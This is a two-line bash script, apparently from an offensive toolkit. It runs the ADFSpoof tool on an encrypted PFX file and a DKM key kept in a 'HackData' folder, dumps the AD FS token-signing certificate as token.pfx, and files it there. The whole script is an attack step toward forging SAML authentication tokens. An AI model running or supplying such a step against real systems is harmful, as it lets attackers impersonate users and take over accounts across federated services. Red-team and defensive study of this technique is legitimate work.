#!/bin/bash

python ../toolz/ADFSpoof/ADFSpoof.py -b ../HackData/EncryptedPfx.bin ../HackData/DKMKey.bin dump
mv ./token.pfx ../HackData/token.pfx
